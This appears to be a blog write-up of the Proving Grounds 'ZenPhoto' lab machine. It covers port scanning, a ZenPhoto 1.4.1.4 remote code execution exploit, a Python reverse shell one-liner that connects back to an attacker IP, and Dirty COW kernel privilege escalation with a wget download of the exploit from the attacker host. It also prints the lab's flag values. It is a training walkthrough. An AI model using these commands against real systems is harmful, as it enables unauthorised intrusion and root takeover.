---
title: Proving Grounds Practice — ZenPhoto             
date: 2025-06-24 00:00:00 +0800      
categories: [proving gounds]          
tags: [proving gounds]         
toc: true                           
comments: false                    
math: false                          
mermaid: false                       
---
- **OS**: Linux
- **Difficulty**: Intermediate

## Service Enumeration

**Port Scan Results**

**TCP**: 22, 23, 80, 3306

**UDP**: 5353

We run nmapAutomator to scan the target and found a few ports open.

> [nmapAutomator - GitHub](https://github.com/21y4d/nmapAutomator)

```
└─$ ./nmapAutomator.sh 192.168.160.41 All 

Running all scans on 192.168.160.41

Host is likely running Unknown OS!


---------------------Starting Port Scan-----------------------



PORT     STATE SERVICE
22/tcp   open  ssh
23/tcp   open  telnet
80/tcp   open  http
3306/tcp open  mysql



---------------------Starting Script Scan-----------------------



PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
|_  2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)
23/tcp   open  ipp     CUPS 1.4
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.4
|_http-title: 403 Forbidden
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.14 (Ubuntu)
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



OS Detection modified to: Linux



---------------------Starting Full Scan------------------------


PORT     STATE SERVICE
22/tcp   open  ssh
23/tcp   open  telnet
80/tcp   open  http
3306/tcp open  mysql



No new ports



----------------------Starting UDP Scan------------------------
                                                                                                                                                            
UDP needs to be run as root, running with sudo...
[sudo] password for kali: 



PORT     STATE SERVICE
5353/udp open  zeroconf


Making a script scan on UDP ports: 5353


PORT     STATE SERVICE VERSION
5353/udp open  mdns    DNS-based service discovery
```

## Initial Access — ZenPhoto remote code execution (RCE)

We bruteforce directory and saw /test.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.160.41/FUZZ -e .php -c -ic
```

![image-20260211032252591](assets/img/image-20260211032252591.png)

Source code shows that its zenphoto with version 1.4.1.4.

![image-20260211032305491](assets/img/image-20260211032305491.png)

It has an rce vulnerbility.

```bash
searchsploit zenphoto
```

![image-20260211032311908](assets/img/image-20260211032311908.png)

get shell

```bash
searchsploit -m 18083
php 18083.php 192.168.160.41 /test/
```

![image-20260211032316523](assets/img/image-20260211032316523.png)

use python reverse shell to upgrade shell to full tty.

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.250",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
nc -lvnp 80
```

![image-20260211032320277](assets/img/image-20260211032320277.png)

**local.txt value:** 10d819b1b76b1a04f565ba3aa4d8a300

```bash
whoami && cat /home/local.txt && ip a
```

![image-20260211032324601](assets/img/image-20260211032324601.png)

## Privilege Escalation — dirty cow kernel exploits

We saw kernal verison is 2.6.32–21-generic.

```bash
uname -a
```

![image-20260211032330501](assets/img/image-20260211032330501.png)

It is affect by CVE-2016–5195, a kernel privilege escalation vulnerbility.

- [https://nvd.nist.gov/vuln/detail/cve-2016-5195](https://nvd.nist.gov/vuln/detail/cve-2016-5195)

We used an exploits at github.

> [GitHub - firefart/dirtycow: Dirty Cow exploit - CVE-2016-5195](https://github.com/firefart/dirtycow/tree/master)

Create users firefart with credentials **firefart:password**, whose uid:gid is 0:0.

```bash
wget -q http://192.168.45.250:3306/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
```

```bash
updog -p 3306
```

![image-20260211032333582](assets/img/image-20260211032333582.png)

Use ssh to login.

```
ssh -oHostKeyAlgorithms=+ssh-rsa firefart@192.168.160.41
```

![image-20260211032337781](assets/img/image-20260211032337781.png)

## Post Exploitation

**proof.txt value:** bea2c75cd1dfa6dd7f575b0180023495

```bash
id && cat /root/root.txt && ifconfig
```

![image-20260211032341578](assets/img/image-20260211032341578.png)
